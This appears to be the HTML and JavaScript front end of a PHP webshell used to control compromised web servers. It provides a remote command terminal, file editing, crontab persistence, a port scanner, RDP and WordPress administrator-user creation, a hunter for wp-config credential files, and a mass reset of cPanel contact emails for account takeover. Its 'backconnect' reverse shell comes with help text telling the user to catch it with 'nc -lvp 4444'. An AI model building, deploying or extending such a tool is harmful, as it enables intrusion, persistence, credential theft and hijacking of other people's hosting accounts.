<div id="mkdirModal" class="modal">
    <div class="modal-content">
        <h3 style="margin-bottom: 20px;"><i class="fas fa-folder-plus"></i> Create New Folder</h3>
        <form method="post">
            <input type="hidden" name="action" value="mkdir">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="text" name="dirname" placeholder="Enter folder name" required style="margin: 10px 0;">
            <div style="display: flex; gap: 10px; margin-top: 20px;">
                <button type="submit" class="btn btn-success">
                    <i class="fas fa-plus"></i> Create Folder
                </button>
                <button type="button" class="btn btn-danger" onclick="closeModal('mkdirModal')">
                    <i class="fas fa-times"></i> Cancel
                </button>
            </div>
        </form>
    </div>
</div>

<div id="newfileModal" class="modal">
    <div class="modal-content">
        <h3 style="margin-bottom: 20px;"><i class="fas fa-file-plus"></i> Create New File</h3>
        <form method="post">
            <input type="hidden" name="action" value="newfile">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="text" name="filename" placeholder="Enter file name (e.g., example.txt)" required style="margin: 10px 0;">
            <textarea name="filecontent" placeholder="File content (optional)" style="height: 300px; margin: 10px 0; font-family: 'Roboto Mono', monospace;"></textarea>
            <div style="display: flex; gap: 10px; margin-top: 20px;">
                <button type="submit" class="btn btn-success">
                    <i class="fas fa-plus"></i> Create File
                </button>
                <button type="button" class="btn btn-danger" onclick="closeModal('newfileModal')">
                    <i class="fas fa-times"></i> Cancel
                </button>
            </div>
        </form>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content">
        <h3 style="margin-bottom: 20px;">Edit File: <span id="editFileName"></span></h3>
        <form id="editForm">
            <input type="hidden" name="filepath" id="editFilePath">
            <textarea name="content" id="editFileContent" style="width:100%; height:60vh; border:1px solid #ced4da; padding:15px; font-family: 'Roboto Mono', monospace; background: #ffffff; color: #000000; font-size: 13px;"></textarea>
            <div style="display: flex; gap: 10px; margin-top: 20px;">
                <button type="button" class="btn btn-success" onclick="saveFile()">Save Changes</button>
                <button type="button" class="btn btn-danger" onclick="closeModal('editModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Zip Files Modal -->
<div id="zipModal" class="modal">
    <div class="modal-content">
        <h3 style="margin-bottom: 20px;"><i class="fas fa-file-archive"></i> Create Zip Archive</h3>
        <div id="zipSelectedFiles" style="background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 15px; max-height: 150px; overflow-y: auto;"></div>
        <input type="text" id="zipName" placeholder="Archive name (e.g., backup.zip)" value="archive_<?php echo date('Y-m-d'); ?>.zip" style="margin: 10px 0;">
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <button type="button" class="btn btn-success" onclick="createZip()">
                <i class="fas fa-file-archive"></i> Create Zip
            </button>
            <button type="button" class="btn btn-danger" onclick="closeModal('zipModal')">
                <i class="fas fa-times"></i> Cancel
            </button>
        </div>
    </div>
</div>

<!-- Unzip File Modal -->
<div id="unzipModal" class="modal">
    <div class="modal-content">
        <h3 style="margin-bottom: 20px;"><i class="fas fa-expand-arrows-alt"></i> Extract Zip File</h3>
        <select id="unzipFileSelect" style="margin: 10px 0;">
            <option value="">-- Select zip file --</option>
            <?php
            $files = @scandir($current_dir);
            if ($files) {
                foreach ($files as $file) {
                    if ($file == '.' || $file == '..') continue;
                    $fullpath = $current_dir . '/' . $file;
                    if (!is_dir($fullpath) && preg_match('/\.(zip|tar|gz|rar)$/i', $file)) {
                        echo '<option value="'.htmlspecialchars($fullpath).'">'.htmlspecialchars($file).'</option>';
                    }
                }
            }
            ?>
        </select>
        <input type="text" id="unzipPath" placeholder="Extraction path (optional)" value="<?php echo htmlspecialchars($current_dir); ?>" style="margin: 10px 0;">
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <button type="button" class="btn btn-success" onclick="extractZip()">
                <i class="fas fa-expand-arrows-alt"></i> Extract
            </button>
            <button type="button" class="btn btn-danger" onclick="closeModal('unzipModal')">
                <i class="fas fa-times"></i> Cancel
            </button>
        </div>
    </div>
</div>

<script>
// Global variables
let commandHistory = JSON.parse(localStorage.getItem('commandHistory') || '[]');
let currentHistoryIndex = -1;
let selectedFiles = new Set();
let contextMenuTarget = null;

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    loadCrontab();
    updateCommandHistoryDisplay();
    
    // Focus terminal input when terminal tab is active
    const terminalInput = document.getElementById('terminalInput');
    if (terminalInput) {
        terminalInput.focus();
        
        // Enter key to execute command
        terminalInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });
        
        // Arrow up/down for command history
        terminalInput.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                navigateHistory(-1);
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                navigateHistory(1);
            }
        });
    }

    // Context menu handling
    document.addEventListener('contextmenu', function(e) {
        if (e.target.closest('.file-item')) {
            e.preventDefault();
            showContextMenu(e);
        }
    });

    document.addEventListener('click', function() {
        hideContextMenu();
    });

    // File selection handling
    document.addEventListener('click', function(e) {
        if (e.target.closest('.file-item') && !e.target.closest('.file-actions')) {
            const fileItem = e.target.closest('.file-item');
            if (e.ctrlKey || e.metaKey) {
                // Multi-select with Ctrl/Cmd
                toggleFileSelection(fileItem);
            } else if (e.shiftKey) {
                // Range select with Shift
                selectFileRange(fileItem);
            } else {
                // Single select
                clearSelection();
                toggleFileSelection(fileItem);
            }
            updateSelectionUI();
        }
    });
});

// Tab switching functions
function showWpUser() { switchTab('wpUser'); }
function showPortScanner() { switchTab('portScanner'); }
function showWebshellScanner() { switchTab('webshellScanner'); }
function showBackconnect() { switchTab('backconnect'); }
function showConfigHunter() { switchTab('configHunter'); }
function showCpanelReset() { switchTab('cpanelReset'); }
function showCrontabManager() { switchTab('crontab'); }
function showRdpManager() { switchTab('rdpManager'); }

function showUpload() {
    document.getElementById('uploadModal').style.display = 'block';
}

function showMkdir() {
    document.getElementById('mkdirModal').style.display = 'block';
}

function showNewFile() {
    document.getElementById('newfileModal').style.display = 'block';
}

function showZipFiles() {
    if (selectedFiles.size === 0) return;
    
    const fileList = document.getElementById('zipSelectedFiles');
    fileList.innerHTML = '<strong>Selected files:</strong><br>' + 
        Array.from(selectedFiles).map(file => `• ${file}`).join('<br>');
    
    document.getElementById('zipModal').style.display = 'block';
}

function showUnzipFile() {
    document.getElementById('unzipModal').style.display = 'block';
}

function closeModal(id) {
    document.getElementById(id).style.display = 'none';
}

function switchTab(tabName) {
    // Hide all tab contents
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Remove active class from all tab buttons
    document.querySelectorAll('.tab-button').forEach(button => {
        button.classList.remove('active');
    });
    
    // Show selected tab content
    document.getElementById(tabName).classList.add('active');
    
    // Activate selected tab button
    event.target.classList.add('active');
    
    // Focus terminal input when switching to terminal
    if (tabName === 'terminal') {
        setTimeout(() => {
            document.getElementById('terminalInput').focus();
        }, 100);
    }
}

// File Selection Functions
function toggleFileSelection(fileItem) {
    const fileName = fileItem.dataset.file;
    if (selectedFiles.has(fileName)) {
        selectedFiles.delete(fileName);
        fileItem.classList.remove('selected');
    } else {
        selectedFiles.add(fileName);
        fileItem.classList.add('selected');
    }
}

function clearSelection() {
    selectedFiles.clear();
    document.querySelectorAll('.file-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
}

function selectFileRange(targetItem) {
    const fileItems = Array.from(document.querySelectorAll('.file-item'));
    const targetIndex = fileItems.indexOf(targetItem);
    
    if (selectedFiles.size === 0) {
        toggleFileSelection(targetItem);
        return;
    }
    
    // Find first selected item
    let firstSelectedIndex = -1;
    for (let i = 0; i < fileItems.length; i++) {
        if (fileItems[i].classList.contains('selected')) {
            firstSelectedIndex = i;
            break;
        }
    }
    
    if (firstSelectedIndex === -1) return;
    
    // Select range
    const start = Math.min(firstSelectedIndex, targetIndex);
    const end = Math.max(firstSelectedIndex, targetIndex);
    
    for (let i = start; i <= end; i++) {
        const fileName = fileItems[i].dataset.file;
        selectedFiles.add(fileName);
        fileItems[i].classList.add('selected');
    }
}

function updateSelectionUI() {
    const count = selectedFiles.size;
    document.getElementById('selectedCount').textContent = count;
    document.getElementById('zipBtn').disabled = count === 0;
}

// Context Menu Functions
function showContextMenu(e) {
    const contextMenu = document.getElementById('contextMenu');
    contextMenuTarget = e.target.closest('.file-item');
    
    contextMenu.style.display = 'block';
    contextMenu.style.left = e.pageX + 'px';
    contextMenu.style.top = e.pageY + 'px';
    
    e.preventDefault();
}

function hideContextMenu() {
    document.getElementById('contextMenu').style.display = 'none';
    contextMenuTarget = null;
}

function contextMenuAction(action) {
    if (!contextMenuTarget) return;
    
    const filePath = contextMenuTarget.dataset.path;
    const fileName = contextMenuTarget.dataset.file;
    const fileType = contextMenuTarget.dataset.type;
    
    switch (action) {
        case 'select':
            toggleFileSelection(contextMenuTarget);
            updateSelectionUI();
            break;
        case 'download':
            if (fileType !== 'dir') {
                window.location.href = '?action=download&file=' + encodeURIComponent(filePath) + '&dir=' + encodeURIComponent('<?php echo $current_dir; ?>');
            }
            break;
        case 'edit':
            if (fileType !== 'dir') {
                editFile(filePath);
            }
            break;
        case 'rename':
            renameFile(filePath);
            break;
        case 'chmod':
            const currentPerm = contextMenuTarget.querySelector('.file-permission').textContent;
            chmodFile(filePath, currentPerm);
            break;
        case 'delete':
            deleteFile(filePath);
            break;
    }
    
    hideContextMenu();
}

// Zip/Unzip Functions
function createZip() {
    const zipName = document.getElementById('zipName').value;
    if (!zipName) {
        alert('Please enter a zip file name');
        return;
    }
    
    const files = Array.from(selectedFiles);
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=zip_files&files=${encodeURIComponent(JSON.stringify(files))}&zip_name=${encodeURIComponent(zipName)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Zip file created successfully: ' + data.output);
            closeModal('zipModal');
            // Refresh page to show new zip file
            setTimeout(() => {
                window.location.reload();
            }, 1000);
        } else {
            alert('Error creating zip: ' + data.output);
        }
    })
    .catch(error => {
        alert('Error: ' + error);
    });
}

function extractZip() {
    const zipFile = document.getElementById('unzipFileSelect').value;
    const extractPath = document.getElementById('unzipPath').value;
    
    if (!zipFile) {
        alert('Please select a zip file');
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=unzip_file&zip_file=${encodeURIComponent(zipFile)}&extract_path=${encodeURIComponent(extractPath)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Zip file extracted successfully: ' + data.output);
            closeModal('unzipModal');
            // Refresh page to show extracted files
            setTimeout(() => {
                window.location.reload();
            }, 1000);
        } else {
            alert('Error extracting zip: ' + data.output);
        }
    })
    .catch(error => {
        alert('Error: ' + error);
    });
}

// RDP Functions
function addRdpUser() {
    const username = document.getElementById('rdpUsername').value;
    const password = document.getElementById('rdpPassword').value;
    
    if (!username || !password) {
        alert('Please enter both username and password');
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=add_rdp_user&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('rdpManagerOutput');
        if (data.success) {
            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
        } else {
            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
        }
    })
    .catch(error => {
        document.getElementById('rdpManagerOutput').innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function enableRdp() {
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'ajax=true&action=enable_rdp'
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('rdpManagerOutput');
        if (data.success) {
            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
        } else {
            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
        }
    })
    .catch(error => {
        document.getElementById('rdpManagerOutput').innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

// Terminal functions
function executeCommand(cmd = null) {
    const terminalInput = document.getElementById('terminalInput');
    const executeBtn = document.getElementById('executeBtn');
    const command = cmd || terminalInput.value.trim();
    
    if (!command) return;
    
    // Add to command history
    if (!commandHistory.includes(command)) {
        commandHistory.unshift(command);
        if (commandHistory.length > 20) {
            commandHistory.pop();
        }
        localStorage.setItem('commandHistory', JSON.stringify(commandHistory));
        updateCommandHistoryDisplay();
    }
    
    // Clear input and disable button
    terminalInput.value = '';
    executeBtn.disabled = true;
    executeBtn.textContent = 'Executing...';
    
    // Show command in output
    const terminalOutput = document.getElementById('terminalOutput');
    terminalOutput.innerHTML += `<div class="terminal-prompt">$ ${command}</div>`;
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
    
    // Execute command via AJAX
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=execute_command&command=${encodeURIComponent(command)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            terminalOutput.innerHTML += `<div class="terminal-output-line">${data.output}</div>`;
        } else {
            terminalOutput.innerHTML += `<div class="terminal-output-line" style="color: #dc3545;">Error: ${data.output}</div>`;
        }
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    })
    .catch(error => {
        terminalOutput.innerHTML += `<div class="terminal-output-line" style="color: #dc3545;">Network error: ${error}</div>`;
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    })
    .finally(() => {
        // Re-enable button
        executeBtn.disabled = false;
        executeBtn.textContent = 'Execute';
        terminalInput.focus();
        currentHistoryIndex = -1;
    });
}

function executeCommandWithDir(cmd) {
    const currentDir = '<?php echo addslashes($current_dir); ?>';
    const command = `cd "${currentDir}" && ${cmd}`;
    executeCommand(command);
}

function insertCommonCommandWithDir(cmd) {
    const terminalInput = document.getElementById('terminalInput');
    terminalInput.value = cmd;
    terminalInput.focus();
}

function clearTerminal() {
    document.getElementById('terminalOutput').innerHTML = '<div>// Terminal cleared</div>';
}

function insertCommonCommand(cmd) {
    const terminalInput = document.getElementById('terminalInput');
    terminalInput.value = cmd;
    terminalInput.focus();
}

function updateCommandHistoryDisplay() {
    const historyContainer = document.getElementById('commandHistory');
    if (historyContainer && commandHistory.length > 0) {
        historyContainer.innerHTML = '<strong>Command History:</strong><br>' + 
            commandHistory.slice(0, 5).map((cmd, index) => 
                `<div class="command-item" onclick="insertCommonCommand('${cmd.replace(/'/g, "\\'")}')">${cmd}</div>`
            ).join('');
    }
}

function navigateHistory(direction) {
    if (commandHistory.length === 0) return;
    
    const terminalInput = document.getElementById('terminalInput');
    
    if (currentHistoryIndex === -1) {
        currentHistoryIndex = direction === -1 ? 0 : commandHistory.length - 1;
    } else {
        currentHistoryIndex += direction;
        if (currentHistoryIndex < 0) currentHistoryIndex = commandHistory.length - 1;
        if (currentHistoryIndex >= commandHistory.length) currentHistoryIndex = 0;
    }
    
    terminalInput.value = commandHistory[currentHistoryIndex];
}

// File editor functions
function editFile(filepath) {
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=get_file_content&filepath=${encodeURIComponent(filepath)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('editFilePath').value = filepath;
            document.getElementById('editFileName').textContent = filepath.split('/').pop();
            document.getElementById('editFileContent').value = data.content;
            document.getElementById('editModal').style.display = 'block';
        } else {
            alert('Error loading file: ' + data.error);
        }
    })
    .catch(error => {
        alert('Error loading file: ' + error);
    });
}

function saveFile() {
    const filepath = document.getElementById('editFilePath').value;
    const content = document.getElementById('editFileContent').value;
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=save_file_content&filepath=${encodeURIComponent(filepath)}&content=${encodeURIComponent(content)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('File saved successfully!');
            closeModal('editModal');
            // Refresh the page to show updated file list
            setTimeout(() => {
                window.location.reload();
            }, 500);
        } else {
            alert('Error saving file: ' + data.error);
        }
    })
    .catch(error => {
        alert('Error saving file: ' + error);
    });
}

function chmodFile(filepath, currentPerm) {
    var newPerm = prompt('Change permissions for:\n' + filepath + '\n\nCurrent: ' + currentPerm + '\nNew (e.g., 755):', currentPerm);
    if (newPerm !== null && newPerm !== '') {
        window.location.href = '?action=chmod&file=' + encodeURIComponent(filepath) + '&perm=' + newPerm + '&dir=' + encodeURIComponent('<?php echo $current_dir; ?>');
    }
}

function renameFile(filepath) {
    var newName = prompt('Rename file:\n' + filepath + '\n\nNew name:', filepath.split('/').pop());
    if (newName !== null && newName !== '') {
        var form = document.createElement('form');
        form.method = 'post';
        form.innerHTML = '<input type="hidden" name="action" value="rename">' +
                         '<input type="hidden" name="oldname" value="' + filepath + '">' +
                         '<input type="hidden" name="newname" value="' + filepath.replace(filepath.split('/').pop(), newName) + '">';
        document.body.appendChild(form);
        form.submit();
    }
}

function deleteFile(filepath) {
    if (confirm('Are you sure you want to delete:\n' + filepath + '?')) {
        window.location.href = '?action=delete&file=' + encodeURIComponent(filepath) + '&dir=' + encodeURIComponent('<?php echo $current_dir; ?>');
    }
}

// Crontab functions
function loadCrontab() {
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'ajax=true&action=view_crontab'
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('crontabOutput');
        const textarea = document.getElementById('crontabContent');
        
        if (data.success) {
            output.textContent = data.output;
            textarea.value = data.output;
        } else {
            output.textContent = data.output;
            textarea.value = data.output;
        }
    })
    .catch(error => {
        document.getElementById('crontabOutput').textContent = 'Error loading crontab: ' + error;
    });
}

function saveCrontab() {
    const content = document.getElementById('crontabContent').value;
    
    if (!confirm('Are you sure you want to update crontab?')) {
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=save_crontab&crontab_content=${encodeURIComponent(content)}`
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('crontabOutput');
        if (data.success) {
            output.textContent = data.output;
            alert('Crontab updated successfully!');
        } else {
            output.textContent = data.output;
            alert('Error updating crontab!');
        }
    })
    .catch(error => {
        alert('Error saving crontab: ' + error);
    });
}

function addCrontabExample() {
    var example = "# Crontab Examples\n\n" +
                 "# Run every minute\n" +
                 "* * * * * /path/to/command\n\n" +
                 "# Run every day at 2:30 AM\n" +
                 "30 2 * * * /path/to/command\n\n" +
                 "# Run every Monday at 5 PM\n" +
                 "0 17 * * 1 /path/to/command\n\n" +
                 "# Run every 10 minutes\n" +
                 "*/10 * * * * /path/to/command\n\n" +
                 "# Run on reboot\n" +
                 "@reboot /path/to/command";
    
    var textarea = document.getElementById('crontabContent');
    textarea.value = textarea.value + '\n\n' + example;
}

function clearCrontab() {
    if (confirm('Are you sure you want to clear the crontab content?')) {
        document.getElementById('crontabContent').value = '';
    }
}

// WordPress User functions
function addWpUser() {
    const form = document.getElementById('wpUserForm');
    const formData = new FormData(form);
    
    const data = {
        username: formData.get('username'),
        password: formData.get('password'),
        email: formData.get('email'),
        role: formData.get('role'),
        wp_config_path: formData.get('wp_config_path')
    };
    
    if (!data.username || !data.password || !data.email || !data.wp_config_path) {
        alert('All fields are required');
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=add_wp_user&username=${encodeURIComponent(data.username)}&password=${encodeURIComponent(data.password)}&email=${encodeURIComponent(data.email)}&role=${encodeURIComponent(data.role)}&wp_config_path=${encodeURIComponent(data.wp_config_path)}`
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('wpUserOutput');
        if (data.success) {
            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
        } else {
            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
        }
    })
    .catch(error => {
        document.getElementById('wpUserOutput').innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function findWpConfig() {
    executeCommand('find /var/www -name "wp-config.php" 2>/dev/null | head -10');
    switchTab('terminal');
}

// Port Scanner functions
function scanPorts() {
    const host = document.getElementById('scanHost').value || 'localhost';
    const ports = document.getElementById('scanPorts').value || '21,22,23,25,53,80,110,443,3306,3389,5432';
    
    const output = document.getElementById('portScannerOutput');
    output.innerHTML = 'Scanning ports...';
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=scan_ports&host=${encodeURIComponent(host)}&ports=${encodeURIComponent(ports)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            output.innerHTML = data.output.split('\n').map(line => {
                if (line.includes('OPEN')) {
                    return `<div style="color: #28a745;">${line}</div>`;
                } else {
                    return `<div style="color: #6c757d;">${line}</div>`;
                }
            }).join('');
        } else {
            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
        }
    })
    .catch(error => {
        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function quickScan() {
    document.getElementById('scanPorts').value = '21,22,80,443,3306,3389';
    scanPorts();
}

// Webshell Scanner functions
function scanWebshells() {
    const path = document.getElementById('scanPath').value || '/var/www';
    
    const output = document.getElementById('webshellScannerOutput');
    output.innerHTML = 'Scanning for webshells...';
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=scan_webshells&scan_path=${encodeURIComponent(path)}`
    })
    .then(response => response.json())
    .then(data => {
        const resultsDiv = document.getElementById('webshellResults');
        resultsDiv.innerHTML = '';
        
        if (data.success && data.files && data.files.length > 0) {
            output.innerHTML = `Found ${data.files.length} suspicious files`;
            
            data.files.forEach(file => {
                const fileDiv = document.createElement('div');
                fileDiv.className = 'webshell-item';
                fileDiv.innerHTML = `
                    <strong>File:</strong> ${file.path}<br>
                    <strong>Size:</strong> ${file.size} bytes<br>
                    <strong>Patterns:</strong> ${file.patterns.join(', ')}<br>
                    <div style="margin-top: 10px;">
                        <button class="btn btn-danger btn-sm" onclick="deleteWebshell('${file.path.replace(/'/g, "\\'")}')">Delete</button>
                        <button class="btn btn-warning btn-sm" onclick="viewWebshellCode('${file.path.replace(/'/g, "\\'")}')">View Code</button>
                    </div>
                `;
                resultsDiv.appendChild(fileDiv);
            });
        } else {
            output.innerHTML = 'No webshells found';
        }
    })
    .catch(error => {
        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function deleteWebshell(filePath) {
    if (!confirm('Are you sure you want to delete this file?')) {
        return;
    }
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=delete_webshell&file_path=${encodeURIComponent(filePath)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('File deleted successfully');
            scanWebshells(); // Refresh scan
        } else {
            alert('Failed to delete file: ' + data.output);
        }
    })
    .catch(error => {
        alert('Error: ' + error);
    });
}

function viewWebshellCode(filePath) {
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=get_webshell_code&file_path=${encodeURIComponent(filePath)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const modal = document.createElement('div');
            modal.className = 'modal';
            modal.style.display = 'block';
            modal.innerHTML = `
                <div class="modal-content">
                    <h3>Webshell Code: ${filePath.split('/').pop()}</h3>
                    <div class="code-preview">${data.content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                    <div style="margin-top: 20px;">
                        <button class="btn btn-danger" onclick="this.closest('.modal').remove()">Close</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        } else {
            alert('Error loading file: ' + data.error);
        }
    })
    .catch(error => {
        alert('Error: ' + error);
    });
}

// Backconnect functions
function startBackconnect() {
    const host = document.getElementById('backconnectHost').value;
    const port = document.getElementById('backconnectPort').value || '4444';
    
    if (!host) {
        alert('Please enter your IP address');
        return;
    }
    
    const output = document.getElementById('backconnectOutput');
    output.innerHTML = 'Starting backconnect...';
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=backconnect&host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
        } else {
            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
        }
    })
    .catch(error => {
        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function showBackconnectHelp() {
    const output = document.getElementById('backconnectOutput');
    output.innerHTML = `
        <strong>Backconnect Help:</strong><br>
        1. On your machine, run: <code>nc -lvp 4444</code><br>
        2. Enter your IP address above<br>
        3. Click "Start Backconnect"<br>
        4. You should get a reverse shell connection<br><br>
        <strong>Note:</strong> This requires outbound connections from the server.
    `;
}

// Config Hunter functions
function scanConfigFiles() {
    const path = document.getElementById('configScanPath').value || '/var/www';
    
    const output = document.getElementById('configHunterOutput');
    output.innerHTML = 'Scanning for config files...';
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=scan_config_files&scan_path=${encodeURIComponent(path)}`
    })
    .then(response => response.json())
    .then(data => {
        const resultsDiv = document.getElementById('configResults');
        resultsDiv.innerHTML = '';
        
        if (data.success && data.files && data.files.length > 0) {
            output.innerHTML = `Found ${data.files.length} config files`;
            
            data.files.forEach(file => {
                const fileDiv = document.createElement('div');
                fileDiv.className = 'config-item';
                fileDiv.innerHTML = `
                    <strong>File:</strong> ${file.path}<br>
                    <strong>Size:</strong> ${file.size} bytes<br>
                    <strong>Modified:</strong> ${file.modified}<br>
                    <div style="margin-top: 10px;">
                        <button class="btn btn-info btn-sm" onclick="viewFileContent('${file.path.replace(/'/g, "\\'")}')">View</button>
                    </div>
                `;
                resultsDiv.appendChild(fileDiv);
            });
        } else {
            output.innerHTML = 'No config files found';
        }
    })
    .catch(error => {
        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function viewFileContent(filePath) {
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=get_file_content&filepath=${encodeURIComponent(filePath)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const modal = document.createElement('div');
            modal.className = 'modal';
            modal.style.display = 'block';
            modal.innerHTML = `
                <div class="modal-content">
                    <h3>File Content: ${filePath.split('/').pop()}</h3>
                    <div class="code-preview">${data.content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                    <div style="margin-top: 20px;">
                        <button class="btn btn-danger" onclick="this.closest('.modal').remove()">Close</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        } else {
            alert('Error loading file: ' + data.error);
        }
    })
    .catch(error => {
        alert('Error: ' + error);
    });
}

// cPanel Reset functions
function resetCpanel() {
    const email = document.getElementById('cpanelEmail').value;
    
    if (!email) {
        alert('Please enter an email address');
        return;
    }
    
    if (!confirm('This will reset cPanel contact email for all users. Continue?')) {
        return;
    }
    
    const output = document.getElementById('cpanelResetOutput');
    output.innerHTML = 'Resetting cPanel emails...';
    
    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `ajax=true&action=reset_cpanel&email=${encodeURIComponent(email)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
        } else {
            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
        }
    })
    .catch(error => {
        output.innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
    });
}

function showCpanelHelp() {
    const output = document.getElementById('cpanelResetOutput');
    output.innerHTML = `
        <strong>cPanel Reset Help:</strong><br>
        This feature resets the contact email in cPanel configuration files.<br>
        It affects all users in /home/*/.cpanel/contactinfo<br><br>
        <strong>Usage:</strong><br>
        1. Enter the new email address<br>
        2. Click "Reset cPanel Email"<br>
        3. All cPanel accounts will use this email for contact
    `;
}
</script>
</body>
</html>
<?php
function format_size($size) {
    if ($size == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB'];
    $unit = 0;
    while ($size >= 1024 && $unit < count($units) - 1) {
        $size /= 1024;
        $unit++;
    }
    return round($size, 2) . ' ' . $units[$unit];
}
?>